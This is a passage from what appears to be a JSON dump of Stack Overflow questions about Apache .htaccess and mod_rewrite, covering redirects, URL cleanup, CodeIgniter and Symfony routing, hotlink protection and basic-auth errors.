%{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteRule ^(?:[a-z]{2}/)?.*-p-([0-9]+)$ page.php?page_id=$1&amp;%{QUERY_STRING}\n  RewriteRule ^(?:[a-z]{2}/)?(.*) $1?%{QUERY_STRING}\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Input URL alternatives:</p>\n\n<ul>\n<li>www.domain.com/some-fancy-title-p-10</li>\n<li>www.domain.com/en/some-fancy-title-p-10</li>\n<li>www.domain.com/sv/some-fancy-title-p-10</li>\n</ul>\n\n<p><strong>Edit:</strong> It appears ?: is not valid regexp in apache1. Avoiding it solves the problem.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12710583,"title":"Yet another subtomain www to non-www RewriteCond","body":"<p>I know that this had been asked numerous times. And I've red them all. And I did all that. And it should work. But it doesn't. </p>\n\n<p>Here's my configuration:</p>\n\n<p>I have main domain: mydomain.com, a html main website. Within that domain, i have a folder called \"app\", like mydomain.com/app. That folder is actually a subdomain (added via dns and google webmaster tools): app.mydomain.com, and php application is hosted there. And it all works. Www redirect is working flawlessly on main domain, but in subdomain, it just doesn't. They are using different .htaccess files.</p>\n\n<p>Take a look at this .htaccess cestion (for subdomain):</p>\n\n<pre><code>ErrorDocument 404 /404.php\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\n\nRewriteCond %{HTTP_HOST} ^www\\.app.\\mydomain.\\com$ [NC]    \nRewriteRule ^(.*)$ http://app.mydomain.com/$1 [R=301,L]\nRewriteCond %{HTTP_HOST} ^ip\\.ip\\.ip\\.ip\nRewriteRule (.*) http://app.mydomain.com/$1 [R=301,L]\n</code></pre>\n\n<p>What's the catch?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12707503,"title":".htaccess redirect noticably increasing load time","body":"<p>I set up a SEF link via .htaccess RewriteRule to one of the articles on my website just to see how that works, and it does work but it considerably increases the load time of that particular page.\nOn average the articles (including the one I'm talking about, when not using the rewrite rule) load in about 1.3 seconds. With the rewrite rule, the load time is 3.3 seconds on average until the page displays, and the loader thingy in the firefox tab keeps spinning for another 2 seconds.\nI have WAMP setup on my computer, and the website is being accessed through no-ip.com.</p>\n\n<p>Here is the .htaccess config (very simple, as you can see):</p>\n\n<pre><code>Options +FollowSymLinks\n\nRewriteEngine On\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^o-sw-liji /NewSWL/o-nama.php?body=o-sw-liji\n</code></pre>\n\n<p>In httpd.conf I have this (somewhere I read this might affect the load time for some reason - searching for files through all the directories or something, I don't remember exactly what I read):</p>\n\n<pre><code>&lt;Directory /&gt;\n    Options None\n    AllowOverride None\n    Order deny,allow\n    Deny from all\n&lt;/Directory&gt;\n\nDocumentRoot \"Z:/Program Files (x86)/wamp/www/\"\n&lt;Directory \"Z:/Program Files (x86)/wamp/www/\"&gt;\n    Options None\n    AllowOverride All\n    Order allow,deny\n    Allow from all\n&lt;/Directory&gt;\n</code></pre>\n\n<p>Any ideas why .htaccess redirect increases the load time by so much?</p>\n\n<p><strong>UPDATE:</strong> so I put a session based counter in the \"o-nama.php\" script. Apparently when I access the web via the 'normal' link i.e. 'o-nama.php?body=o-sw-liji', the counter increases by one, as it should - it's one page load. But when the page is accessed through the redirected link, i.e. 'o-nama/o-sw-liji' the counter increases by 6-8, which naturally makes the load time a lot longer, since it's loading the same page for 6-8 times. I have no idea why this is happening. Any help is appreciated.</p>\n\n<p><strong>UPDATE 2:</strong> Solved it, answer posted below.</p>\n"},{"tags":[".htaccess","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12717014,"title":"How to redirect any request after the first slash using htaccess","body":"<p>i would like to redirect using htaccess to a page that cchecks the query string and sends it to the right page. example <a href=\"http://domain.com/test/one/\" rel=\"nofollow\">http://domain.com/test/one/</a> gets redirected to <a href=\"http://domain.com/index.php?route=/test/one/\" rel=\"nofollow\">http://domain.com/index.php?route=/test/one/</a> without changing the url structure in the browser or modifying it. I want the htaccess to pick up anything after the first slash and send it to the index.php file. </p>\n\n<p>PS i found this link <a href=\"http://stackoverflow.com/questions/9091773/htaccess-to-redirect-any-request\">htaccess to redirect ANY request</a> but it modifies the url and throws a 301.</p>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12715528,"title":"apache server: redirect all url request to index.php","body":"<p>I am using apache server on my mac, everything works well.</p>\n\n<p>Now I have a webpage, whose <code>index.php</code> is quite complex: \nIn <code>index.php</code>, it expects url like: <code>localhost/~username/hostname/page_a</code>.\nAnd the content of <code>page_a</code> is actually a <code>.php</code> file stored in <code>content</code> folder.\nSo in <code>index.php</code>, it just parses <code>page_a</code>, and do a include: '' to render the request page.</p>\n\n<p>But In <code>.htaccess</code>, the redirect rule was not properly configured.</p>\n\n<p>For example, if I click a link: <code>localhost/~username/hostname/page_a</code>,\nis there any way to redirect this url to <code>index.php</code>,\nand at the same time, the url will still be <code>localhost/~username/hostname/page_a</code>,\nso that <code>index.php</code> can parse and render it correctly?</p>\n\n<p>Thanks.</p>\n"},{"tags":["regex",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":12076594,"title":"htaccess 301 redirects, not sure about correct regex","body":"<p>Can anyone help me, I am trying to sort out some redirects using htaccess but I am facing a tricky issue.</p>\n\n<p>The part I cannot figure out is this: I have a system which creates 2 urls for some pages of the following pattern:</p>\n\n<p>products/category (what we are using mostly and what we want, regardless of category depth)\nproducts/subcategory/category (better for SEO maybe but not what we want)</p>\n\n<p>How can I write a 301 redirect to strip out the /subcategory part of the url and redirect to the shorter version where we have in the region of 80 subcategories so I don't want to attempt this one by one. I am trying to get to grips with Regex but I am totally green with it, I am assuming matching the subcategory isn't too hard as it always follows /product and always ends with / but how do I redirect it to the shortened version.</p>\n\n<p>I can't think of more information to add but if I haven't given enough detail let me know, I would love some help with this.</p>\n\n<p>Thanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","symfony2"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12716360,"title":"Symfony2: mod_rewrite / htaccess to get rid of \"web/app.php\" ... strange behaviour","body":"<p>I want to get rid of the \"web/app.php\"+\"web/app_dev.php\" in the URLs of my symfony2 installation. I know, that virtual host is the best way, but you don't always have you own host. So I tried it with mod_rewrite in the htaccess of my project folder (http://localhost/my-sf2-project/.htaccess) ... how to do it, is explained a lot on here. And fortunately, the rewrite process is doing something with this htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    Options +FollowSymLinks\n    RewriteEngine On\n    RewriteBase /my-sf2-project/\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ web/app_dev.php [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>So that means, when I try to request <code>http://localhost/my-sf2-project/page/1</code>, the server should redirect to <code>http://localhost/my-sf2-project/web/app_dev.php/page/1</code>. My rewrite log is confirming it: </p>\n\n<blockquote>\n  <p>internal redirect with /my-sf2-project/web/app_dev.php/page/1\n  [INTERNAL REDIRECT]</p>\n</blockquote>\n\n<p>But now the strange thing does happen... the symfony2 dev enviroment is saying: </p>\n\n<blockquote>\n  <p>No route found for \"GET /my-sf2-project/page/1\"!</p>\n</blockquote>\n\n<p>That means the request is somehow redirected to</p>\n\n<ul>\n<li><strong>http://localhost/my-sf2-project/web/app_dev.php/my-sf2-project/page/1</strong> </li>\n</ul>\n\n<p>instead of </p>\n\n<ul>\n<li><strong>http://localhost/my-sf2-project/web/app_dev.php/page/1</strong></li>\n</ul>\n\n<p>How does that happen? Is there some setting in the apache config or a error in my mod rewrite, that could explain that strange behaviour?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12710953,"title":"How to redirect a folder including all sub-folders and files ONLY to root, WITHOUT preserving the file structure?","body":"<p>I need to 301 redirect a directory that hosted an old CMS installation to the root of the same domain in .htaccess, including all subdirectories and files, without preserving the original file structure.</p>\n\n<p>I have tried this code</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^joomla/.*$ / [R=301]\n</code></pre>\n\n<p>which does redirect the <code>/joomla/</code> directory to root, but whenever a subfolder or a filename is added it results in a 404 page not found. Is there a way I can make sure that everything under <code>/joomla/</code> just gets redirected to root?</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12707440,"title":"How to internally add /blog/ to the url with .htaccess?","body":"<p>Hi I have wordpress installation in subfolder /blog/, as it has to co-exist with other legacy cms, so now if i wish to access some page of wordpress i need to use links as \nwww.domain.com/blog/news/ and would like to rather use www.domain.com/news/.</p>\n\n<p>So basically for certain links i need to add this /blog/ somehow internally so wordpress\nwould handle it normally.</p>\n\n<p>Please note it will be few links so rewrite rules can be literal.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12707167,"title":"Htaccess single page redirect problems","body":"<p>I'm having some issues setting up single page redirects using htaccess. Currently I have a htaccess file with:</p>\n\n<pre><code>RewriteCond %{SCRIPT_FILENAME} !-s\nRewriteRule (.*) index.php?path=$1 [QSA,L]\n</code></pre>\n\n<p>Then a set of redirects e.g.</p>\n\n<pre><code>Redirect 301 /oldpage.htm http://www.mydomain.com/new-page\n</code></pre>\n\n<p>But the problem I am having is that  when I go into a browser and type in the old URL, I get redirected to URL with a parameter attached, e.g: </p>\n\n<p>\"http://www.mydomain.com/new-page?path=oldpage.htm\"</p>\n\n<p>For some of my redirects this seems to work anyway, for some it produces a 404 error. I've also tried using RewriteCond and Rewrite Rule to write more generic catch all redirects for those pages that I can, and I'm having the same issue.</p>\n\n<p>I'm thinking that some other rule must be interfering with my redirects - the only one I can see which might do so is the rule above, but if that was the case shouldn't the URL I am redirected to end up being</p>\n\n<p>\"http://www.mydomain.com/index.php?path=oldpage.htm\"</p>\n\n<p>Can anyone explain why parameters are being appended to the URLs and how I can stop this happening so that my redirects work?</p>\n\n<p>Cheers!   </p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12699847,"title":"Rewriting path for a specific file using htaccess","body":"<p>I would like to create a friendly url for a specific file from a directory that has a long file path as well as renaming the file. I am not even sure if this is possible. </p>\n\n<p>So far I have tried in htaccess:</p>\n\n<pre><code>RewriteEngine On \nOptions +FollowSymLinks\nRewriteRule eventdays-2012/brochure.pdf(.+)$ sites/default/files/docs/fact_sheet-204499207.pdf\n</code></pre>\n\n<p>... but this is not working. </p>\n\n<p>I've done some searching and see where you can mask an entire directory in the file path but in my case I just want to do one file within the directory, create a directory name and change the file name as well. </p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting","friendly-url"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12699408,"title":"Url rewriting mod_rewrite with and without query string","body":"<p>I'm trying to rewrite from  domain.com/page/soft-15/android-26/ to page.php?cat=15&amp;os=26 with this code:</p>\n\n<pre><code>RewriteRule ^page/([0-9]+)\\-([a-zA-Z0-9-]*)/([0-9]+)\\-([a-zA-Z0-9-]*)$ page.php?cat=$1&amp;os=$2\n</code></pre>\n\n<p>I thinks it works fine but, how can i rewrite domain.com/page/ and domain.com/page (without the last forward slash) to domain.com/page.php keeping both rules working?</p>\n"},{"tags":[".htaccess","mobile","video","device","mp4"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12700486,"title":"can't play/download MP4 files from behind .htaccess on mobile device such as android / blackberry","body":"<p>I have made a site with a password protected directory and\n inside is simple html page with link to mp4 video file located inside directory.</p>\n\n<p>When logged into to directory Android device such as Samsung Galaxy S2 or Blackberry Playbook fail to open this video file. On desktop , IE and FF work fine.</p>\n\n<p>this is response from host:</p>\n\n<blockquote>\n  <p>\"It appears this is a limitation of the browsers in mobile devices being unable to use the authentication that has already been completed to fetch the video file using the embeded player. After investigating in depth I am unable to get any other player to play video on my mobile device if it is behind a .htaccess password protection since the requests for the actual video file are being denied with 403.\"</p>\n</blockquote>\n\n<p>So what is solution to play Mp4 behind htaccess on mobile device?</p>\n"},{"tags":["php",".htaccess","optimization","load"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12689417,"title":"Does moving out of directory to the .htaccess file increase the CPU load time and CPU cycle","body":"<p>I have many hyperlinks like this: \nThis link is placed in interact folder and links to the main folder.</p>\n\n<pre><code>&lt;a href='../user/\" . $id . \"/\".$name.\"' target='_self'&gt;\" . $name. \"&lt;/a&gt;\n</code></pre>\n\n<p>Which goes back to the main directory of the website and in the main directory there is a <code>.htaccess</code> file with this code</p>\n\n<pre><code>RewriteRule ^user/([0-9]*) interact/profile1.php?id=$1 [L,QSA]\n</code></pre>\n\n<p>I have done this to make URL look like:</p>\n\n<pre><code>http://www.domain.com/user/ \n</code></pre>\n\n<p>Instead of this:</p>\n\n<pre><code>http://www.domain.com/interact/user\n</code></pre>\n\n<p>This makes the request return to the same directory it came from that is the /interact directory. I have many hyperlinks that do something like this. Will having many such hyperlinks increase the CPU load time ?</p>\n"},{"tags":["apache",".htaccess","localhost",".htpasswd"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12499732,"title":"Apache is looking for htaccess and htpasswd files that aren't there","body":"<p>Having an issue where Apache is requesting authentication, and looking for an .htpasswd file, based on instructions from an .htaccess file that's no longer in DocumentRoot.  Background:</p>\n\n<p>In my DocumentRoot, I'd previously copied an .htaccess and .htpasswd file from another machine (along with all of the other website files).</p>\n\n<p>.htaccess contents:</p>\n\n<pre><code>AuthType Basic\nAuthName \"Password is required\"\nAuthUserFile /some/directory/that/was/on/the/other/server/not/this/one/.htpasswd\nRequire valid-user\n</code></pre>\n\n<p>Here's the catch: <em>I moved .htaccess and .htpasswd out of DocumentRoot and even renamed the files.</em>  There is no longer an .htaccess file in DocumentRoot at all.</p>\n\n<p>But, when I try to access localhost from a browser, I am prompted to enter the login and password.  </p>\n\n<p>When I enter the login and password (from the old, not-in-DocumentRoot .hpasswd file), I get a 500 Internal Server error and the log shows:</p>\n\n<pre><code>[error] [client 127.0.0.1] (2)No such file or directory: Could not open password file: /some/directory/that/was/on/the/other/server/not/this/one/.htpasswd\n</code></pre>\n\n<p>This has been quite a puzzle, because <em>there's no longer a .htaccess or .htpasswd file anywhere in DocumentRoot</em> !!  </p>\n\n<p>Have tried several apache restarts and also tried using a blank .htaccess file in the DocumentRoot.  Even grepped the entire machine for references to <code>AuthType Basic</code> to see if I missed anything.</p>\n\n<p>httpd.conf looks normal enough...I can post that if needed, but this question seems long enough as it is :)</p>\n\n<p>Thanks for any assistance you can provide</p>\n"},{"tags":["apache",".htaccess","ini"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12708335,"title":"Parse INI-file inside .htaccess","body":"<p>How can I parse a ini-file within .htaccess? In my case .htaccess placed in the root directory (/) and target ini-file is /conf/params.ini.</p>\n"},{"tags":["php",".htaccess","mobile"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":249,"score":3,"question_id":9849816,"title":"Rewrite rule in htaccess for mobile version","body":"<p>I am using codeigniter framework for my site and I have  done two site one for accessing through mobile and another for accessing through pcs.  both are in same domain . My site url is like this <code>http://mydomain.com</code>And my mobile is <code>http://mydomain.com/celphone</code>. I need to write htaccess rule which redirect to site url <code>http://mydomain.com/celphone</code> when i am accessing site from mobile and i need to rewrite to <code>http://mydomain.com/</code> when i am accessing the site from pc.</p>\n\n<p>How can i write rewrite rule in such case ,please help any help will be appreciated.</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12705703,"title":"My 301 redirect via htaccess code is not working sometimes","body":"<p>The 301 redirect is working sometime and somes time not\nWhat could be the problem in below code its over a week now</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^usedcarindelhi\\.com$ [OR]\n\nRewriteCond %{HTTP_HOST} ^www\\.usedcarindelhi\\.com$\n\nRewriteRule ^/?$ \"http\\:\\/\\/www\\.mycarhelpline\\.com\\/index\\\n.php\\?option\\=com_usedcar\\&amp;view\\=category\\&amp;Itemid\\=3\\&amp;location\\=delhi\" [R=301,L]\n</code></pre>\n\n<p>i basically need to move usedcarindelhi.com &amp; www.usedcarindelhi.com to</p>\n\n<p><a href=\"http://www.mycarhelpline.com/index.php?option=com_usedcar&amp;view=category&amp;Itemid=3&amp;location=delhi\" rel=\"nofollow\">http://www.mycarhelpline.com/index.php?option=com_usedcar&amp;view=category&amp;Itemid=3&amp;location=delhi</a></p>\n\n<p>Sometimes the 301 redirect is working making me go to mycarhelpline n sometimes am find myself on usedcarindelhi</p>\n\n<p>can someone help in this pls\nThanks</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12247320,"title":".htaccess, URL changes but loading content","body":"<p>I'm having an issue with .htaccess where I have managed to successfully rewrite the URLs but the content is no longer loading.</p>\n\n<p>The following is my htaccess file.</p>\n\n<p>I'm aiming for all my .html pages (the site is made of .html static pages) to have their extensions removed. However, I require the .html URLs to 301 redirect to the new URL's so that my SEO does not take a hit from these changes.</p>\n\n<p>Example:</p>\n\n<ul>\n<li>Original: www.example.co.uk/page.html</li>\n<li>Desired: www.example.co.uk/page/</li>\n</ul>\n\n<p>It is important that the original URL redirects the new URL's though.</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\n\n# REDIRECT yourdomain.com TO www.yourdomain.com\nRewriteCond %{HTTP_HOST} !^www.example.co.uk$ [NC]\nRewriteRule ^(.*)$ http://www.example.co.uk/$1 [L,R=301]\n\nRewriteRule (.+)\\.html?$ http://www.example.co.uk/$1/ [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.html -f\nRewriteRule ^(([^/]*/)*[^/.]+)$ $1.html [L]\n</code></pre>\n\n<p>I have tried the htaccess above and I've also tried the variation below, but neither has worked as desired. Any help would be much appreciated.</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\n\n# REDIRECT yourdomain.com TO www.yourdomain.com\nRewriteCond %{HTTP_HOST} !^www.example.co.uk$ [NC]\nRewriteRule ^(.*)$ http://www.example.co.uk/$1 [L,R=301]\n\nRewriteRule (.+)\\.html?$ http://www.example.co.uk/$1/ [R=301,L]\n</code></pre>\n"},{"tags":["jquery","ajax",".htaccess","codeigniter","tabs"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":146,"score":2,"question_id":12677625,"title":"Load a piece of html in a jQuery tab using jQuery AJAX on Codeigniter","body":"<p>I'm here because I can't load a piece oh html code (a form that contain the client's data) in a JQuery tabs, using JQuery AJAX. \nI tried to use JQuery .load(), .append() .html(), but I can't load a simple html form in a JQuery tab.\nI use <strong>codeigniter</strong> and in the controller there are some function: \none of this named <strong><em>findClient</em></strong> create a CI pagination, that had a table that contain a radio input. </p>\n\n<pre><code>class Management extends CI_Controller {\n\nfunction __construct(){\n    parent::__construct();  \n    $this-&gt;load-&gt;library('myclients');\n    session_start();\n}\n\n\nfunction index($clientsFound=0){\n      ...\n  ...       \n}\n\n\npublic function findCliente(){\n    // generate a pagination, in a table. each row have a radio, \n    // and hads a rispective id of that record\n}\n</code></pre>\n\n<p>When I click on the submit button, in a tab-1....\nI call a JQuery AJAX</p>\n\n<pre><code>$('#fm_submit_report').click(function(event){\n            event.preventDefault();\n            var form_data = {\n                id_client: $('input:checked').val(),\n                ci_csrf_token: $.cookie(\"ci_csrf_token\")\n            };\n            var form = $(this);\n            $.ajax({\n                url: 'management/createReport',\n                type: 'POST',\n                async : false,\n                data: form_data,\n                dataType: 'html',\n                success: function(dati, stato){\n                    $('#tabs').tabs('select',4);\n                    alert('Creation of a Report');\n                    console.log('stato: '+stato+'   received data: '+dati);\n                    $('#create_report').load(dati);\n                    alert('end of load');\n                },\n                error: function(xhr) {\n\n                var message = 'Errore nell\\'invio del form: ';\n                var status = xhr.status;\n                var text = xhr.statusText;\n\n                message += status + ': ' + text;\n\n                $('&lt;div class=\"error\"/&gt;').text(message).\n                appendTo(form);\n\n                }\n            });\n            return false;\n</code></pre>\n\n<p>This ajax, pass the cient id, to the method <strong><em>createReport()</em></strong>. As U can see, this method, get the client informations using <em>myclients</em> library, and after pass this information, in a \"<em>piece of html code</em>\" to create a form with the client data inside  </p>\n\n<pre><code>public function createReport(){\n    $client=$this-&gt;myclients-&gt;findClientById($this-&gt;input-&gt;post('id_cliente'));\n    $data['client'] = $client;\n // this is a client information to pass in the view to generate the form, that will load in a tab\n\n   $hthmlcode=$this-&gt;load-&gt;view('create_report', $data);\n   // create_view is the html form \n\n echo $htmlcode;\n}\n\n}/* End of function createReport */\n</code></pre>\n\n<p>The html code to load in a JQuery tab is this</p>\n\n<pre><code>&lt;table&gt;\n&lt;tr&gt;\n    &lt;td&gt;                                                         \n        &lt;table style=\"margin-top:0\" cellpadding=\"0\" cellspacing=\"0\" border=\"0\"&gt;\n            &lt;?php echo form_open('management/storeReport') ?&gt;\n            &lt;tr&gt;\n                &lt;td class=\"report_left\"&gt;&lt;h2&gt;Visit Date&lt;/h2&gt;&lt;/td&gt;\n                &lt;td class=\"report_dx\"&gt;&lt;?php echo form_input('data_visita', '', 'class=\"data\", id=\"datepickervisita\"'); ?&gt;&lt;/td&gt;\n            &lt;/tr&gt;\n            [ ...cut ...]\n            &lt;/tr&gt;\n        &lt;/table&gt;\n        &lt;?php echo form_input($btnInviaReport); ?&gt;\n\n        &lt;?php echo form_close(); ?&gt;\n        &lt;div class=\"error_report\"&gt;&lt;/div&gt;\n    &lt;/td&gt;  \n&lt;/tr&gt;    \n&lt;/table&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>But unfortunately the code in html was not loaded in the 5th tabs... and the post return the entire page (instead my html form) !!!</p>\n\n<p>I noticed, in firebug console,that the path of <em>controller/method</em> that I set in the url of ajax, is wrong, in fatc i set </p>\n\n<pre><code>url: 'management/createReport'\n</code></pre>\n\n<p>but in the console i see that the post is send to this address:</p>\n\n<pre><code>http://_local_ip_/management/management/createReport\n</code></pre>\n\n<p>but, obviously, if I don't set the controller (just set url:'createReport'), the return variable \"dati\" will be empty, because I call a method of an undefined controller</p>\n\n<pre><code>success: function(dati, stato)\n</code></pre>\n\n<p>I suspect, that my <em>.htaccess</em> file is the cause of this trouble (why the name of controller is repeated twice, when the ajax is called ???)</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    RewriteCond %{ENV:REDIRECT_STATUS} 200\n    RewriteRule .* - [L]\n\n    RewriteRule ^(system|application) - [F,L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Submitted by: Fabdrol\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^public.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt; \n</code></pre>\n\n<p>public is the folder of my project, and it's outside of system directory ...</p>\n"},{"tags":[".htaccess","mod-rewrite","encoding","iis7","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12687647,"title":"encoding with .htaccess","body":"<p><br /> To access a page in my website I use this rule</p>\n\n<pre><code>^/map/(.+)\\-([0-9]{1,5})/map-.+\\-street\\-([a-z])\\.html$\n</code></pre>\n\n<p>The link I use is <code>www.mydomain.com/map/neus%e4%df-86/map-neus%e4%df-street-a.html</code>. \n When I'll chekc the IIS7 rewrite log the link is transformed to <br/> <code>/map/neusä߆/map-neusäß-street-a.html</code>, and of course I got a 404 error.</p>\n\n<p>So, my question is, why is <code>neus%e4%df-86</code> transormed to <code>neusä߆</code>\n instead of <code>neustäß</code> <br />\n(P.S. the page-s encoding is charset=iso-8859-1)</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":13,"score":1,"question_id":12702272,"title":"How to write a htaccess rule which adds a trailing forward slash to a url?","body":"<p>For example, for <code>www.example.com/foo/dosomething/</code>, I have such a htaccess document:</p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule ^dosomething/$ myfile.php [L]\n</code></pre>\n\n<p>This htaccess file is inside my foo directory, which actually exists. But then I realised that, users who type the url in might forget the trailing forward slash, so they might type in this: <code>www.example.com/foo/dosomething</code>, and then he/she will get a 404. I don't want that, so I wrote this instead:</p>\n\n<pre><code>RewriteRule ^dosomething/$ myfile.php [L]\n</code></pre>\n\n<p>But then I remembered that this isn't SEO friendly, as two 'web pages' have the exact same content. So what I want now, is if the url doesn't have a trailing forward slash at the end, for the htaccess to redirect from, for example: <code>www.example.com/foo/dosomething</code> to <code>www.example.com/foo/dosomething/</code>?</p>\n"},{"tags":["linux","apache",".htaccess","mod-rewrite","hotlinking"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12242438,"title":"how to generic .htaccess to prevent hotlink","body":"<p>The following code works fine:</p>\n\n<pre><code>RewriteCond %{HTTP_REFERER} !^http://superwebx.com/.*$ [NC]\nRewriteRule .*\\.(jpe?g|gif|bmp|png|swf|css)$ - [F]\n</code></pre>\n\n<p>but I want to make a generic script serve me for several sites I manage, but fails try to get</p>\n\n<pre><code>RewriteCond %{HTTP_REFERER} !^http://%{HTTP_HOST}/.*$ [NC]\nRewriteRule .*\\.(jpe?g|gif|bmp|png|swf|css)$ - [F]\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","permissions"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":112,"score":0,"question_id":12553569,"title":"htaccess to change url","body":"<p>I have the following code in my .htacess but it didn't work right. Is it because mod-rewrite is no \"on\", if so, how can i check?</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteRule ^(.*)\\$ $1.php [nc]\n</code></pre>\n\n<p>I wanted to rename my address, example:</p>\n\n<p><a href=\"http://www.abc.com\" rel=\"nofollow\">http://www.abc.com</a> -> <a href=\"http://www.abc.com\" rel=\"nofollow\">http://www.abc.com</a></p>\n\n<p><a href=\"http://abc.com\" rel=\"nofollow\">http://abc.com</a> -> <a href=\"http://www.abc.com\" rel=\"nofollow\">http://www.abc.com</a></p>\n\n<p><a href=\"http://www.abc.com/123.html\" rel=\"nofollow\">http://www.abc.com/123.html</a> -> <a href=\"http://www.abc.com/123\" rel=\"nofollow\">http://www.abc.com/123</a></p>\n\n<p><a href=\"http://www.abc.com/12-12-12.html\" rel=\"nofollow\">http://www.abc.com/12-12-12.html</a> -> <a href=\"http://www.abc.com/12-12-12\" rel=\"nofollow\">http://www.abc.com/12-12-12</a></p>\n\n<p><a href=\"http://subdomain.abc.com/123.html\" rel=\"nofollow\">http://subdomain.abc.com/123.html</a> -> <a href=\"http://subdomain.abc.com/123\" rel=\"nofollow\">http://subdomain.abc.com/123</a></p>\n\n<p>Basically removing the extension and ensuring that its www is intact.</p>\n\n<p>Edited:</p>\n\n<p>It was rewrote into</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteCond % ^example.com [NC]\nRewriteRule ^(.*)$ http://www.example.com/$1 [L,R=301]\nRewriteRule ^(.*).php $1\n</code></pre>\n\n<p>but still not working</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":16,"score":1,"question_id":12667649,"title":"Check file exists with mod_rewrite","body":"<p>i want check if exist a file with \"jpg\" extension, in else check if \"gif\" exist, in else load a default image. All with mod_rewrite, i readed a lot of examples and all are the same. I want check a regex url. Now my httacces is this but not found:</p>\n\n<pre><code>RewriteEngine On\n#RewriteBase /\n\n# Do not do anything for already existing files and folders\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} 